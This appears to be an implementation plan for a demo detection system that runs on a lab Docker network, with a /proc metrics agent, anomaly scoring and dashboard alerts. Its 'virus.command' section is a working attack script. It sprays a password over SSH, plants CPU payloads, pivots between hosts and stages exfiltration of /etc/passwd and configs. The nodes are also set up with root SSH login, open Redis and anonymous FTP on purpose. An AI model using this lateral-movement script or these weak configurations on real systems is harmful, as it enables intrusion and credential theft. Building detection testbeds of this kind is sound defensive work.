# SOMA Real Network Implementation Plan

## Overview

Replace the simulated Python duty-cycle workers with real Docker containers on a real bridge network. Each node becomes an actual Ubuntu container running real services (SSH, nginx, Redis, FTP). A lightweight SOMA agent runs inside every container and reports real `/proc` behavioral metrics to the backend. The virus actually spreads via SSH lateral movement. Detection is purely behavioral — CPU z-score + network I/O + new TCP connections, all from real data.

---

## What changes

| Before | After |
|---|---|
| 6 Python duty-cycle processes on host | 5 Docker containers on `soma-net` 172.20.0.0/24 |
| Simulated anomaly scores (random.gauss) | Real z-scores from container `/proc` data |
| No network between nodes | Real TCP/IP — SSH, HTTP, Redis, FTP |
| Virus only runs on host | Virus SSHes into containers, pivots between them |
| Detection on host CPU only | Multi-signal: CPU + net bytes out + new TCP connections |
| Honeypot is one WS server | Honeypot mirrors enterprise0 (same nginx, same files, real SSH) |

---

## File tree

```
SOMA/
├── docker-compose.yml                         NEW
├── network.md                                 THIS FILE
└── backend/
    ├── soma_agent.py                           NEW  — runs inside every container
    ├── ws_server.py                            MODIFY
    ├── virus.command                           MODIFY
    ├── honeypot_server.py                      MODIFY
    ├── dockerfiles/
    │   ├── Dockerfile.node                     NEW  — base image (Ubuntu + SSH + agent)
    │   ├── Dockerfile.enterprise0              NEW  — + nginx
    │   ├── Dockerfile.enterprise1              NEW  — + redis
    │   ├── Dockerfile.op_server0               NEW  — + vsftpd
    │   ├── Dockerfile.honeypot                 REPLACE existing
    │   ├── entrypoint.sh                       NEW  — base node entrypoint
    │   ├── entrypoint_enterprise0.sh           NEW
    │   ├── entrypoint_enterprise1.sh           NEW
    │   ├── entrypoint_op_server0.sh            NEW
    │   └── entrypoint_honeypot.sh              NEW
    ├── configs/
    │   ├── sshd_config                         NEW  — weak SSH for all nodes (demo)
    │   ├── nginx_enterprise0.conf              NEW
    │   ├── nginx_honeypot.conf                 NEW  — identical to enterprise0
    │   └── vsftpd.conf                         NEW
    └── fake_data/
        ├── user0/                              NEW  — documents for exfil demo
        │   ├── credentials.txt
        │   ├── project_notes.txt
        │   └── ssh_config
        ├── enterprise0/                        NEW  — fake corporate web portal
        │   ├── index.html
        │   ├── employees.json
        │   ├── financial_report_q4.pdf
        │   └── admin/config.json
        ├── enterprise1/                        NEW
        │   └── redis_seed.sh
        └── op_server0/                         NEW  — fake FTP files
            ├── backups/db_backup_2024-01-15.sql.gz
            ├── financial/payroll_dec_2024.csv
            └── system/passwords_backup.txt
```

Frontend changes:
```
frontend/src/
├── App.jsx                      MODIFY — lateral_movement message + alert banner
└── components/
    └── LiveNetworkGraph.jsx     MODIFY — animate real traffic edges
```

---

## Network topology

```
soma-net  bridge  172.20.0.0/24

172.20.0.1   Docker gateway (host reachable from containers as host.docker.internal)
172.20.0.10  soma-user0        SSH:22
172.20.0.20  soma-enterprise0  SSH:22  HTTP:80 (host:8081)
172.20.0.21  soma-enterprise1  SSH:22  Redis:6379
172.20.0.30  soma-op-server0   SSH:22  FTP:21
172.20.0.99  soma-honeypot     SSH:22  HTTP:80 (host:8082)  WS:8766

Host Mac = attacker origin + SOMA backend on :8765
```

---

## docker-compose.yml

```yaml
version: '3.8'

networks:
  soma-net:
    name: soma-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1

x-common: &common
  extra_hosts:
    - "host.docker.internal:host-gateway"
  restart: unless-stopped

services:
  soma-user0:
    <<: *common
    build:
      context: backend
      dockerfile: dockerfiles/Dockerfile.node
    container_name: soma-user0
    hostname: soma-user0
    networks:
      soma-net:
        ipv4_address: 172.20.0.10
    environment:
      NODE_NAME: User0
      SOMA_HOST: host.docker.internal
      SOMA_PORT: "8765"

  soma-enterprise0:
    <<: *common
    build:
      context: backend
      dockerfile: dockerfiles/Dockerfile.enterprise0
    container_name: soma-enterprise0
    hostname: soma-enterprise0
    networks:
      soma-net:
        ipv4_address: 172.20.0.20
    environment:
      NODE_NAME: Enterprise0
      SOMA_HOST: host.docker.internal
      SOMA_PORT: "8765"
    ports:
      - "8081:80"

  soma-enterprise1:
    <<: *common
    build:
      context: backend
      dockerfile: dockerfiles/Dockerfile.enterprise1
    container_name: soma-enterprise1
    hostname: soma-enterprise1
    networks:
      soma-net:
        ipv4_address: 172.20.0.21
    environment:
      NODE_NAME: Enterprise1
      SOMA_HOST: host.docker.internal
      SOMA_PORT: "8765"

  soma-op-server0:
    <<: *common
    build:
      context: backend
      dockerfile: dockerfiles/Dockerfile.op_server0
    container_name: soma-op-server0
    hostname: soma-op-server0
    networks:
      soma-net:
        ipv4_address: 172.20.0.30
    environment:
      NODE_NAME: Op_Server0
      SOMA_HOST: host.docker.internal
      SOMA_PORT: "8765"

  soma-honeypot:
    <<: *common
    build:
      context: backend
      dockerfile: dockerfiles/Dockerfile.honeypot
    container_name: soma-honeypot
    hostname: soma-honeypot
    networks:
      soma-net:
        ipv4_address: 172.20.0.99
    environment:
      NODE_NAME: Honeypot
      SOMA_HOST: host.docker.internal
      SOMA_PORT: "8765"
    ports:
      - "8766:8766"
      - "8082:80"
```

---

## Dockerfile.node (base image)

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 python3-pip \
    iproute2 procps net-tools curl sshpass \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir websockets

# Intentionally weak credentials for demo
RUN useradd -m -s /bin/bash soma && echo 'soma:soma123' | chpasswd
RUN mkdir -p /run/sshd

COPY configs/sshd_config /etc/ssh/sshd_config
COPY soma_agent.py /soma_agent.py
COPY fake_data/user0/ /home/soma/documents/
COPY dockerfiles/entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22
CMD ["/entrypoint.sh"]
```

```bash
# entrypoint.sh
#!/bin/bash
ssh-keygen -A
/usr/sbin/sshd -D &
exec python3 /soma_agent.py
```

---

## Dockerfile.enterprise0

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 python3-pip \
    iproute2 procps net-tools curl sshpass nginx \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir websockets

RUN useradd -m -s /bin/bash soma && echo 'soma:soma123' | chpasswd
RUN mkdir -p /run/sshd

COPY configs/sshd_config /etc/ssh/sshd_config
COPY configs/nginx_enterprise0.conf /etc/nginx/sites-enabled/default
COPY soma_agent.py /soma_agent.py
COPY fake_data/enterprise0/ /var/www/html/
COPY dockerfiles/entrypoint_enterprise0.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22 80
CMD ["/entrypoint.sh"]
```

```bash
# entrypoint_enterprise0.sh
#!/bin/bash
ssh-keygen -A
/usr/sbin/sshd -D &
nginx -g 'daemon off;' &
exec python3 /soma_agent.py
```

---

## Dockerfile.enterprise1

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 python3-pip \
    iproute2 procps net-tools curl redis-server \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir websockets

RUN useradd -m -s /bin/bash soma && echo 'soma:soma123' | chpasswd
RUN mkdir -p /run/sshd

COPY configs/sshd_config /etc/ssh/sshd_config
COPY soma_agent.py /soma_agent.py
COPY fake_data/enterprise1/redis_seed.sh /redis_seed.sh
RUN chmod +x /redis_seed.sh
COPY dockerfiles/entrypoint_enterprise1.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22 6379
CMD ["/entrypoint.sh"]
```

```bash
# entrypoint_enterprise1.sh
#!/bin/bash
ssh-keygen -A
/usr/sbin/sshd -D &
redis-server --protected-mode no --daemonize yes
sleep 1 && /redis_seed.sh
exec python3 /soma_agent.py
```

---

## Dockerfile.op_server0

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 python3-pip \
    iproute2 procps net-tools curl vsftpd \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir websockets

RUN useradd -m -s /bin/bash soma && echo 'soma:soma123' | chpasswd
RUN mkdir -p /run/sshd /srv/ftp/public
RUN chown -R soma:soma /srv/ftp

COPY configs/sshd_config /etc/ssh/sshd_config
COPY configs/vsftpd.conf /etc/vsftpd.conf
COPY soma_agent.py /soma_agent.py
COPY fake_data/op_server0/ /srv/ftp/public/
COPY dockerfiles/entrypoint_op_server0.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22 21
CMD ["/entrypoint.sh"]
```

```bash
# entrypoint_op_server0.sh
#!/bin/bash
ssh-keygen -A
/usr/sbin/sshd -D &
vsftpd /etc/vsftpd.conf &
exec python3 /soma_agent.py
```

---

## Dockerfile.honeypot (replaces existing)

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 python3-pip \
    iproute2 procps net-tools curl nginx \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir websockets

RUN useradd -m -s /bin/bash soma && echo 'soma:soma123' | chpasswd
RUN mkdir -p /run/sshd

COPY configs/sshd_config /etc/ssh/sshd_config
# Identical nginx config to enterprise0 — attacker sees the same site
COPY configs/nginx_honeypot.conf /etc/nginx/sites-enabled/default
COPY soma_agent.py /soma_agent.py
COPY honeypot_server.py /honeypot_server.py
# Same files as enterprise0 — convincing decoy
COPY fake_data/enterprise0/ /var/www/html/
COPY fake_data/user0/ /home/soma/documents/
COPY dockerfiles/entrypoint_honeypot.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 22 80 8766
CMD ["/entrypoint.sh"]
```

```bash
# entrypoint_honeypot.sh
#!/bin/bash
ssh-keygen -A
/usr/sbin/sshd -D &
nginx -g 'daemon off;' &
python3 /honeypot_server.py &
exec python3 /soma_agent.py
```

---

## configs/sshd_config

```
Port 22
PasswordAuthentication yes
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PrintMotd no
Subsystem sftp /usr/lib/openssh/sftp-server
```

---

## configs/nginx_enterprise0.conf

```nginx
server {
    listen 80 default_server;
    root /var/www/html;
    index index.html;
    server_name _;

    location / {
        try_files $uri $uri/ =404;
        autoindex on;
    }
}
```

---

## configs/nginx_honeypot.conf

Identical to nginx_enterprise0.conf — this is the point. Same config, same files, attacker cannot tell the difference.

---

## configs/vsftpd.conf

```
listen=YES
listen_ipv6=NO
anonymous_enable=YES
local_enable=YES
write_enable=NO
anon_root=/srv/ftp
dirmessage_enable=YES
use_localtime=YES
connect_from_port_20=YES
```

---

## fake_data contents

### fake_data/user0/

**credentials.txt**
```
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghp_exampleTokenHere1234567890abcdef
DB_PASSWORD=Pr0d_DB_Pass_2024!
```

**project_notes.txt**
```
Q1 2025 Roadmap — CONFIDENTIAL
- Launch new customer portal by March
- Migrate to new data center (see ops team)
- Budget approved: $2.4M
Internal Slack: #engineering-private
```

**ssh_config**
```
Host enterprise0
    HostName 172.20.0.20
    User soma
    IdentityFile ~/.ssh/id_rsa

Host op-server
    HostName 172.20.0.30
    User soma
```

### fake_data/enterprise0/

**index.html** — Acme Corp internal portal with links to employees.json, financial report, and admin config.

**employees.json** — 847 fake employee records with names, emails, departments, salaries.

**financial_report_q4.pdf** — named as PDF, actually plaintext with fake revenue figures ($48.2M), cost breakdowns, projections.

**admin/config.json**
```json
{
  "db_host": "172.20.0.21",
  "db_port": 6379,
  "db_password": "Pr0d_DB_Pass_2024!",
  "api_key": "sk-prod-8f3a2c1d9e7b4f6a",
  "environment": "production"
}
```

### fake_data/enterprise1/

**redis_seed.sh**
```bash
#!/bin/bash
redis-cli set corp:employee_count 847
redis-cli set corp:api_key "sk-prod-8f3a2c1d9e7b4f6a"
redis-cli set corp:db_password "Pr0d_DB_Pass_2024!"
redis-cli set corp:ceo_email "j.hartwell@acmecorp.internal"
redis-cli lpush corp:recent_logins "alice" "bob" "charlie" "diana" "evan"
redis-cli set corp:payroll_total "4823000"
```

### fake_data/op_server0/

```
backups/
  db_backup_2024-01-15.sql.gz    (empty gzip, named for demo)
  db_backup_2024-01-08.sql.gz

financial/
  payroll_dec_2024.csv           (fake payroll: 847 rows, names + salaries)
  q4_2024_report.xlsx            (fake, actually CSV renamed)

system/
  passwords_backup.txt           (fake credential list, named for demo)
```

---

## soma_agent.py (full)

```python
#!/usr/bin/env python3
"""
SOMA node agent — runs inside each container.
Reads real /proc data every second, reports to:
  ws://{SOMA_HOST}:{SOMA_PORT}/agent/{NODE_NAME}

Message format:
{
  "type":            "agent_metrics",
  "node":            "Enterprise0",
  "cpu_pct":         12.4,
  "mem_pct":         38.2,
  "proc_count":      47,
  "proc_list":       [{"pid": 1, "name": "sshd"}, ...],  # top 15
  "net_bytes_out":   2048,    # bytes sent on eth0 since last tick
  "net_bytes_in":    512,
  "tcp_conn_count":  3,
  "new_connections": [{"src_ip": "172.20.0.10", "src_port": 54321,
                        "dst_ip": "172.20.0.20", "dst_port": 22}]
}
"""

import asyncio, json, os, socket, time

NODE_NAME = os.environ.get("NODE_NAME", "Unknown")
SOMA_HOST = os.environ.get("SOMA_HOST", "host.docker.internal")
SOMA_PORT = int(os.environ.get("SOMA_PORT", 8765))
WS_URI    = f"ws://{SOMA_HOST}:{SOMA_PORT}/agent/{NODE_NAME}"
IFACE     = "eth0"

# ── CPU (/proc/stat) ─────────────────────────────────────────────────────────

_prev_busy, _prev_total = 0, 1

def _cpu_pct():
    global _prev_busy, _prev_total
    with open("/proc/stat") as f:
        fields = list(map(int, f.readline().split()[1:8]))
    user, nice, system, idle, iowait, irq, softirq = fields
    busy  = user + nice + system + irq + softirq
    total = busy + idle + iowait
    db    = busy  - _prev_busy
    dt    = total - _prev_total
    _prev_busy, _prev_total = busy, total
    return round(db / dt * 100, 2) if dt > 0 else 0.0

# ── Memory (/proc/meminfo) ───────────────────────────────────────────────────

def _mem_pct():
    vals = {}
    with open("/proc/meminfo") as f:
        for line in f:
            k, v = line.split(":", 1)
            vals[k.strip()] = int(v.strip().split()[0])
    total = vals.get("MemTotal", 1)
    avail = vals.get("MemAvailable", total)
    return round((total - avail) / total * 100, 2)

# ── Process list (/proc) ─────────────────────────────────────────────────────

def _proc_list():
    procs = []
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            with open(f"/proc/{pid}/comm") as f:
                name = f.read().strip()
            procs.append({"pid": int(pid), "name": name})
        except OSError:
            pass
    return procs

# ── Network I/O (/proc/net/dev) ──────────────────────────────────────────────

_prev_bytes_out, _prev_bytes_in = 0, 0

def _net_delta():
    global _prev_bytes_out, _prev_bytes_in
    try:
        with open("/proc/net/dev") as f:
            for line in f:
                if IFACE not in line:
                    continue
                parts     = line.split()
                bytes_in  = int(parts[1])
                bytes_out = int(parts[9])
                d_out = max(0, bytes_out - _prev_bytes_out)
                d_in  = max(0, bytes_in  - _prev_bytes_in)
                _prev_bytes_out = bytes_out
                _prev_bytes_in  = bytes_in
                return d_out, d_in
    except Exception:
        pass
    return 0, 0

# ── TCP connections (/proc/net/tcp) ──────────────────────────────────────────

def _parse_addr(h):
    ip_hex, port_hex = h.split(":")
    ip   = socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1])
    port = int(port_hex, 16)
    return ip, port

_prev_conn_set: set = set()

def _tcp_conns():
    conns = []
    try:
        with open("/proc/net/tcp") as f:
            lines = f.readlines()[1:]
        for line in lines:
            parts = line.split()
            if len(parts) < 4 or parts[3] != "01":   # 01 = ESTABLISHED
                continue
            src_ip, src_port = _parse_addr(parts[1])
            dst_ip, dst_port = _parse_addr(parts[2])
            conns.append((src_ip, src_port, dst_ip, dst_port))
    except Exception:
        pass
    return conns

def _new_conns(current):
    global _prev_conn_set
    cur_set = set(current)
    new     = cur_set - _prev_conn_set
    _prev_conn_set = cur_set
    return [{"src_ip": s, "src_port": sp, "dst_ip": d, "dst_port": dp}
            for s, sp, d, dp in new]

# ── Main ─────────────────────────────────────────────────────────────────────

async def run():
    import websockets
    print(f"[agent:{NODE_NAME}] → {WS_URI}")
    # Warm up (first /proc/stat call always gives 0)
    _cpu_pct(); _net_delta(); time.sleep(1)

    while True:
        try:
            async with websockets.connect(WS_URI, ping_interval=10) as ws:
                print(f"[agent:{NODE_NAME}] connected")
                while True:
                    cpu   = _cpu_pct()
                    mem   = _mem_pct()
                    procs = _proc_list()
                    out_b, in_b = _net_delta()
                    conns = _tcp_conns()
                    new_c = _new_conns(conns)

                    await ws.send(json.dumps({
                        "type":            "agent_metrics",
                        "node":            NODE_NAME,
                        "cpu_pct":         cpu,
                        "mem_pct":         mem,
                        "proc_count":      len(procs),
                        "proc_list":       procs[:15],
                        "net_bytes_out":   out_b,
                        "net_bytes_in":    in_b,
                        "tcp_conn_count":  len(conns),
                        "new_connections": new_c,
                    }))
                    await asyncio.sleep(1)
        except Exception as e:
            print(f"[agent:{NODE_NAME}] disconnected ({e}), retry 3s")
            await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(run())
```

---

## ws_server.py changes

### New globals

```python
import collections

_agent_data:      dict = {}   # node_name → latest agent_metrics dict
_agent_baselines: dict = {}   # node_name → {cpu_mean, cpu_std, net_mean, net_std, conn_mean, conn_std}
_agent_windows:   dict = {}   # node_name → {"cpu": deque(60), "net": deque(60), "conn": deque(60)}
```

### New route in `_handle_client`

Add to the path routing block:

```python
elif path.startswith("/agent/"):
    node_name = path[len("/agent/"):]
    await _handle_agent(websocket, node_name)
```

### New function `_handle_agent`

```python
async def _handle_agent(websocket, node_name: str):
    print(f"[ws/agent] {node_name} connected")

    if node_name not in _agent_windows:
        _agent_windows[node_name] = {
            "cpu":  collections.deque(maxlen=60),
            "net":  collections.deque(maxlen=60),
            "conn": collections.deque(maxlen=60),
        }

    try:
        async for raw in websocket:
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if msg.get("type") != "agent_metrics":
                continue

            _agent_data[node_name] = msg

            # Update rolling baseline only during clean states
            if _get_state() in ("CLEAN", "EMAIL_RECEIVED"):
                w = _agent_windows[node_name]
                w["cpu"].append(msg["cpu_pct"])
                w["net"].append(msg["net_bytes_out"])
                w["conn"].append(msg["tcp_conn_count"])
                if len(w["cpu"]) >= 10:
                    _agent_baselines[node_name] = {
                        "cpu_mean":  float(np.mean(w["cpu"])),
                        "cpu_std":   float(max(np.std(w["cpu"]), 0.5)),
                        "net_mean":  float(np.mean(w["net"])),
                        "net_std":   float(max(np.std(w["net"]), 500.0)),
                        "conn_mean": float(np.mean(w["conn"])),
                        "conn_std":  float(max(np.std(w["conn"]), 0.3)),
                    }

            # Detect SSH lateral movement: new connection to port 22 from soma-net
            for c in msg.get("new_connections", []):
                if c["dst_port"] == 22 and c["src_ip"].startswith("172.20.0."):
                    print(f"[detector] SSH lateral move → {node_name} from {c['src_ip']}")
                    await _broadcast({
                        "type":        "lateral_movement",
                        "target_node": node_name,
                        "src_ip":      c["src_ip"],
                        "timestamp":   time.time(),
                    })

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        print(f"[ws/agent] {node_name} disconnected")
```

### New function `_score_container_node`

```python
def _score_container_node(node_name: str) -> float:
    """
    Multi-signal anomaly score from real container agent metrics.
    Signals weighted: CPU 40% + net bytes out 40% + TCP connections 20%.
    All z-scored against the rolling clean baseline.
    """
    metrics  = _agent_data.get(node_name)
    baseline = _agent_baselines.get(node_name)
    if not metrics or not baseline:
        return 0.05

    z_cpu  = (metrics["cpu_pct"]        - baseline["cpu_mean"])  / baseline["cpu_std"]
    z_net  = (metrics["net_bytes_out"]  - baseline["net_mean"])  / baseline["net_std"]
    z_conn = (metrics["tcp_conn_count"] - baseline["conn_mean"]) / baseline["conn_std"]

    z = 0.4 * max(z_cpu, 0) + 0.4 * max(z_net, 0) + 0.2 * max(z_conn, 0)
    return round(float(np.clip(CLEAN_FLOOR + z * SCORE_SCALE, 0.0, 1.0)), 3)
```

### Replace sim node readings in `_psutil_loop`

```python
# Replace the entire else branch (non-User0 nodes):
else:
    metrics = _agent_data.get(name)
    if metrics:
        cpu        = metrics["cpu_pct"] / 100.0
        real_procs = metrics["proc_count"]
        node_pid   = None   # container, not a single host PID
        anom       = _score_container_node(name)
    else:
        # Agent not yet connected — show as offline
        cpu, real_procs, node_pid, anom = 0.0, 0, None, 0.05
```

### Remove entirely

- `_spawn_sim_nodes()`
- `_kill_sim_nodes()`
- `_SIM_NODE_TARGETS`
- `_sim_node_procs`
- `_SIM_WORKER`
- `sim_node_worker.py` import/reference
- The `atexit.register(_kill_sim_nodes)` call
- `_train_behavioral_baseline()` call from `__main__` (baseline now comes from agent rolling windows)

`__main__` simplifies to:

```python
if __name__ == "__main__":
    _train_behavioral_baseline()   # still calibrate User0 (host) baseline
    asyncio.run(main())
```

---

## virus.command changes — Phase 2: SSH lateral movement

Append after the existing CPU workers start and WS backdoor connects:

```bash
# ── Phase 2: Lateral movement ──────────────────────────────────────────────
echo ""
echo "[*] Scanning soma-net topology..."
sleep 0.8
echo "    172.20.0.10  soma-user0        SSH open"
echo "    172.20.0.20  soma-enterprise0  SSH open  HTTP open"
echo "    172.20.0.21  soma-enterprise1  SSH open  Redis open"
echo "    172.20.0.30  soma-op-server0   SSH open  FTP open"
echo ""
sleep 0.5
echo "[*] Credential spray: soma:soma123"
sleep 0.5

# Infect soma-user0
sshpass -p soma123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    soma@172.20.0.10 \
    "nohup python3 -c '
import math
while True: _=sum(math.sqrt(i) for i in range(200000))
' >/dev/null 2>&1 &" 2>/dev/null \
&& echo "[+] 172.20.0.10 (soma-user0)        INFECTED" \
|| echo "[-] 172.20.0.10 unreachable"
sleep 0.8

# Infect enterprise0, queue exfil
sshpass -p soma123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    soma@172.20.0.20 "
nohup python3 -c '
import math
while True: _=sum(math.sqrt(i) for i in range(200000))
' >/dev/null 2>&1 &
ls /var/www/html/ > /tmp/.exfil
cat /var/www/html/admin/config.json >> /tmp/.exfil
cat /etc/passwd >> /tmp/.exfil
echo exfil_complete
" 2>/dev/null \
&& echo "[+] 172.20.0.20 (soma-enterprise0)  INFECTED + exfil queued" \
|| echo "[-] 172.20.0.20 unreachable"
sleep 0.8

# Pivot: host → enterprise0 → op_server0
sshpass -p soma123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    soma@172.20.0.20 "
sshpass -p soma123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    soma@172.20.0.30 \
    'nohup python3 -c \"
import math
while True: _=sum(math.sqrt(i) for i in range(200000))
\" >/dev/null 2>&1 &'
" 2>/dev/null \
&& echo "[+] Pivot: enterprise0 → op_server0  INFECTED" \
|| echo "[-] Pivot failed"

echo ""
echo "[!] 3 nodes compromised. Full network access."
echo "[*] Exfiltrating credentials and configs..."
```

---

## Frontend changes

### useWebSocket.js — handle new message type

```javascript
case "lateral_movement":
  setLateralAlerts(prev => [...prev.slice(-9), msg]);
  break;
```

Expose `lateralAlerts` from the hook.

### App.jsx — LateralMovementAlert component

```jsx
function LateralMovementAlert({ alerts }) {
  if (!alerts.length) return null;
  return (
    <div className="lateral-alerts">
      {alerts.map((a, i) => (
        <div key={i} className="lateral-alert">
          <span className="lateral-icon">⚡</span>
          <strong>LATERAL MOVE</strong>
          <span>{a.src_ip} → {a.target_node} via SSH</span>
        </div>
      ))}
    </div>
  );
}
```

### LiveNetworkGraph.jsx — real traffic edge animation

Accept `lateralAlerts` prop. When a `lateral_movement` arrives for a node, overlay a red marching-dashes line on the corresponding static topology edge for 8 seconds, then fade it out. The edge path is determined by looking up both endpoints in `POS`.

---

## Detection signal map

| Attack action | Container signal | What fires |
|---|---|---|
| virus CPU workers start on host | host CPU z-score rises | User0 (host) turns red |
| SSH into soma-user0 | `new_connections[dst_port=22]` from host IP | `lateral_movement` broadcast → alert banner |
| CPU payload in soma-user0 | agent reports cpu_pct spike | User0 container node turns red |
| SSH into soma-enterprise0 | `new_connections[dst_port=22]` from 172.20.0.10 | `lateral_movement` broadcast |
| Web file exfil on enterprise0 | net_bytes_out spike (large read → TCP send) | Enterprise0 anomaly score rises |
| SSH pivot to soma-op-server0 | `new_connections[dst_port=22]` on op_server | `lateral_movement` broadcast |
| Virus redirected to honeypot | Honeypot agent reports new SSH + CPU spike | Honeypot panel shows real activity |

---

## Implementation order

| Step | Work | Est. time |
|---|---|---|
| 1 | `fake_data/` — all fake files | 30 min |
| 2 | `configs/` — sshd, nginx, vsftpd | 20 min |
| 3 | `soma_agent.py` | 45 min |
| 4 | All `Dockerfile.*` + `entrypoint*.sh` | 45 min |
| 5 | `docker-compose.yml` + `docker-compose build` + smoke test | 45 min |
| 6 | `ws_server.py` — `/agent/` handler + scoring + remove sim nodes | 90 min |
| 7 | `virus.command` — phase 2 lateral movement | 45 min |
| 8 | `useWebSocket.js` + `App.jsx` + `LiveNetworkGraph.jsx` | 60 min |
| 9 | Full end-to-end demo run + fixes | 30 min |
| **Total** | | **~8 hours** |

---

## Build and run

```bash
# One-time: build all images (~5 min)
docker-compose build

# Start all node containers
docker-compose up -d

# Verify all running
docker ps

# Start SOMA backend (containers connect automatically)
GMAIL_USER=soma.demo.inbox@gmail.com \
GMAIL_APP_PASSWORD="your-app-password" \
python3 backend/ws_server.py

# Start frontend
cd frontend && npm start

# Verify enterprise0 nginx is live
curl http://localhost:8081/

# Run the demo
bash ~/Downloads/soma_security_patch.command
```

---

## Verification checklist

- [ ] `docker ps` shows all 5 containers running
- [ ] `ws_server.py` logs show `[ws/agent] Enterprise0 connected` etc. for all nodes
- [ ] Dashboard shows real CPU/mem from containers (not 0.05)
- [ ] `curl http://localhost:8081/` returns Acme Corp portal HTML
- [ ] `redis-cli -h 172.20.0.21 get corp:api_key` returns the seeded value
- [ ] Virus CPU workers appear in host Activity Monitor at ~65% system CPU
- [ ] SSH into soma-user0 via `sshpass` produces a `lateral_movement` broadcast visible in dashboard
- [ ] Enterprise0 anomaly score rises after SSH pivot and exfil
- [ ] `lateral_movement` alert banners appear on dashboard for each hop
- [ ] Honeypot at `http://localhost:8082/` serves same HTML as enterprise0
- [ ] SOMA state machine progresses: CLEAN → EMAIL_RECEIVED → INFECTED → ISOLATING → CONTAINED → PURGED
- [ ] "Purge & Destroy" kills docker container, lateral movement stops, scores return to baseline
